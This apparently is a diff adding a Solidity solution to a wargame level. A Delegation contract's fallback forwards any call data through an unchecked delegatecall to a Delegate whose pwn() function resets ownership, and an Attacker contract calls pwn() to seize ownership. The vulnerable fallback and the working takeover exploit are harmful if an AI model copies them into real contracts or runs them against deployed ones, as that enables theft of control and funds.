@@ -1,0 +1,44 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+
+contract Attacker{
+    address public delegation;
+    constructor(address delegationContractAddress){
+        delegation=delegationContractAddress;
+    }
+    function attack()external {
+      delegation.call(abi.encodeWithSignature("pwn()"));
+
+    }
+}
